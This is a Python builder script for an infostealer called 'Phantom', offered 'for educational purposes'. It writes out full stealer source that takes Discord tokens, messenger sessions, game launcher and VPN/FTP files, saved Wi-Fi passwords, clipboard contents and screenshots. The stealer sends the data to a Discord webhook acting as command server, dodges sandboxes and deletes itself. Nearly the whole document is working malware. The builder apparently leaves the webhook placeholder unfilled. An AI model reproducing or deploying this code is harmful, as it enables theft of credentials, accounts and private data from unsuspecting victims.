from colorama import Fore

banner = f"""{Fore.BLUE}
-------------------------------------------------------------------------------------------------------------
                            Python Stealer made for EDUCATIONAL PURPOSES ONLY
                                       Discord Contact: @y452
                                             © Faith452
-------------------------------------------------------------------------------------------------------------

                                         
"""

phantomstealertemplate = r'''
# © Faith452, 2026
# ==================================
# Made by faith452, @y452 on Discord
# ----------------------------------
# No right to modify, re-distribute or claim this tool as yours.

import os, sys, json, base64, sqlite3, shutil, requests, platform, socket, getpass, uuid, datetime, re, glob, zipfile, tempfile, time, random, subprocess
from pathlib import Path
from urllib.parse import urlparse

try: from PIL import ImageGrab
except: ImageGrab = None

try: import psutil
except: psutil = None

try: import pyperclip
except: pyperclip = None

C2 = "{webhookurlinput}"
TAG = f"PHANTOM-{random.randint(100000,999999)}-{datetime.date.today().strftime('%y%m%d')}"

def env_probe():
    if not psutil: return False
    try:
        if psutil.cpu_percent(interval=0.8) < 2.5 or len(psutil.process_iter()) < 40: return True
        if time.time() - psutil.boot_time() < 600: return True
    except: pass
    return False

def grab_screen():
    if ImageGrab:
        try:
            p = tempfile.NamedTemporaryFile(prefix="ph_", suffix=".jpg", delete=False).name
            ImageGrab.grab().save(p, "JPEG", quality=65)
            return p
        except: pass
    return None

def grab_clip():
    return pyperclip.paste()[:4000] if pyperclip else ""

def token_patterns():
    return [r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}', r'mfa\.[\w-]{84,}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}\.[\w-]{8}']

def harvest_tokens():
    t = set()
    roots = [os.path.expandvars(r"%APPDATA%"), os.path.expandvars(r"%LOCALAPPDATA%")]
    pats = token_patterns()
    for root in roots:
        for d, _, _ in os.walk(root):
            if any(x in d.lower() for x in ['discord', 'lightcord', 'betterdiscord']):
                for f in glob.glob(os.path.join(d, "*.[lL][oOdDbB]*")):
                    try:
                        with open(f, "rb") as fd:
                            data = fd.read().decode(errors='ignore')
                            for pat in pats:
                                t.update(re.findall(pat, data))
                    except: pass
    return list(t)

def harvest_messengers():
    paths = {
        'telegram':   r"%APPDATA%\Telegram Desktop\tdata",
        'signal':     r"%APPDATA%\Signal\config.json",
        'whatsapp':   r"%APPDATA%\WhatsApp\session",
        'element':    r"%APPDATA%\Element\IndexedDB",
        'skype':      r"%APPDATA%\Skype",
    }
    res = {}
    for n, p in paths.items():
        ep = os.path.expandvars(p)
        if os.path.exists(ep):
            res[n] = ep if os.path.isdir(ep) else [ep]
    return res

def harvest_gaming():
    paths = {
        'steam':      [r"%PROGRAMFILES(X86)%\Steam\config\*.vdf", r"%PROGRAMFILES(X86)%\Steam\userdata"],
        'epic':       [r"%LOCALAPPDATA%\EpicGamesLauncher\Saved\Data"],
        'battle_net': [r"%PROGRAMDATA%\Battle.net", r"%APPDATA%\Battle.net"],
        'riot':       [r"%LOCALAPPDATA%\Riot Games"],
        'origin':     [r"%PROGRAMFILES(X86)%\Origin"],
        'uplay':      [r"%PROGRAMFILES(X86)%\Ubisoft\Ubisoft Game Launcher"],
        'rockstar':   [r"%LOCALAPPDATA%\Rockstar Games"],
    }
    res = {}
    for n, gl in paths.items():
        found = []
        for g in gl:
            for p in glob.glob(os.path.expandvars(g), recursive=True):
                if os.path.isfile(p) and os.path.getsize(p) < 4*1024*1024: found.append(p)
        if found: res[n] = found
    return res

def harvest_vpn_ftp():
    paths = {
        'nordvpn':    r"%APPDATA%\NordVPN",
        'expressvpn': r"%APPDATA%\ExpressVPN",
        'filezilla':  r"%APPDATA%\FileZilla",
        'winscp':     r"%APPDATA%\WinSCP",
    }
    res = {}
    for n, p in paths.items():
        ep = os.path.expandvars(p)
        if os.path.exists(ep):
            res[n] = ep if os.path.isdir(ep) else [ep]
    return res

def harvest_wifi():
    if platform.system() != "Windows": return ""
    try:
        out = subprocess.check_output("netsh wlan show profiles", shell=True, text=True, stderr=subprocess.DEVNULL)
        names = [l.split(":",1)[1].strip() for l in out.splitlines() if "All User Profile" in l]
        res = []
        for n in names[:20]:
            try:
                r = subprocess.check_output(f'netsh wlan show profile name="{n}" key=clear', shell=True, text=True, stderr=subprocess.DEVNULL)
                k = [l for l in r.splitlines() if "Key Content" in l]
                if k: res.append(f"{n}: {k[0].split(':',1)[1].strip()}")
            except: pass
        return "\n".join(res)
    except: return ""

def harvest_sys():
    try:
        ip = requests.get("https://api.ipify.org", timeout=4).text
    except: ip = "err"
    return {
        "ts": datetime.datetime.now().isoformat(),
        "user": getpass.getuser(),
        "host": socket.gethostname(),
        "os": platform.platform(),
        "ip": ip,
        "mac": ':'.join(f"{(uuid.getnode() >> i) & 0xff:02x}" for i in range(0,48,8)[::-1]).upper(),
        "tag": TAG
    }

def collect_all():
    meta = harvest_sys()
    toks = harvest_tokens()
    msgs = harvest_messengers()
    games = harvest_gaming()
    vpnftp = harvest_vpn_ftp()
    wifi = harvest_wifi()
    clip = grab_clip()
    screen = grab_screen()
    return {
        "meta": meta,
        "tokens": toks[:120],
        "messengers": list(msgs.keys()),
        "gaming": list(games.keys()),
        "vpn_ftp": list(vpnftp.keys()),
        "wifi": wifi,
        "clip": clip[:1200],
        "screen": screen,
        "files": {**msgs, **games, **vpnftp}
    }, screen

def exfil(data, screen_path):
    h = {"User-Agent": random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/132.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0"
    ])}
    e = {
        "title": f"Phantom • {data['meta']['tag']}",
        "color": 0x0f0f23,
        "fields": [
            {"name": "→ Victim", "value": f"{data['meta']['user']} @ {data['meta']['host']}", "inline": True},
            {"name": "OS / IP", "value": f"{data['meta']['os'][:70]}\n{data['meta']['ip']}", "inline": True},
            {"name": "Tokens", "value": str(len(data["tokens"])), "inline": True},
            {"name": "Apps", "value": f"M:{len(data['messengers'])} G:{len(data['gaming'])} V:{len(data['vpn_ftp'])}", "inline": True},
        ]
    }
    if data["wifi"]: e["fields"].append({"name": "WiFi", "value": f"```text\n{data['wifi'][:800]}```", "inline": False})
    if data["clip"]: e["fields"].append({"name": "Clip", "value": f"```text\n{data['clip']}```", "inline": False})

    try: requests.post(C2, json={"embeds": [e]}, headers=h, timeout=10)
    except: pass

    for p, n, m, c in [
        (data.get("screen"), "phantom-s.jpg", "image/jpeg", "Screen"),
        (None, None, None, None)
    ]:
        if p and os.path.exists(p):
            try:
                with open(p, "rb") as f:
                    requests.post(C2, files={"file": (n, f, m)}, data={"content": c}, headers=h, timeout=14)
                os.unlink(p)
            except: pass

    if data["files"]:
        try:
            z = tempfile.NamedTemporaryFile(prefix="ph_", suffix=".zip", delete=False).name
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                for cat, paths in data["files"].items():
                    if isinstance(paths, str): paths = [paths]
                    for fp in paths:
                        if os.path.exists(fp):
                            if os.path.isdir(fp):
                                for root, _, fs in os.walk(fp):
                                    for fn in fs:
                                        full = os.path.join(root, fn)
                                        if os.path.getsize(full) < 3*1024*1024:
                                            arc = os.path.relpath(full, fp)
                                            zf.write(full, f"{cat}/{arc}")
                            else:
                                if os.path.getsize(fp) < 3*1024*1024:
                                    zf.write(fp, f"{cat}/{Path(fp).name}")
            if os.path.getsize(z) < 20*1024*1024:
                with open(z, "rb") as f:
                    requests.post(C2, files={"file": ("phantom-arc.zip", f, "application/zip")}, data={"content": "Archive"}, headers=h, timeout=35)
            os.unlink(z)
        except: pass

if __name__ == "__main__":
    if env_probe(): sys.exit(0)
    time.sleep(random.uniform(6, 24))
    d, s = collect_all()
    exfil(d, s)
    try: os.unlink(sys.executable if getattr(sys, 'frozen', False) else __file__)
    except: pass'''

print(banner)
webhookurlinput = input(f"{Fore.MAGENTA}Enter your Discord Webhook URL (Full URL) >> ")
filenameinput = input(f"{Fore.MAGENTA}Enter Output File's Name (Include .py at the end) >> ")
print(f"{Fore.WHITE}Writing to file..")
with open(filenameinput, "w", encoding="utf-8") as f:
    f.write(phantomstealertemplate)

print(f"{Fore.GREEN}[+] {filenameinput} has been generated!")
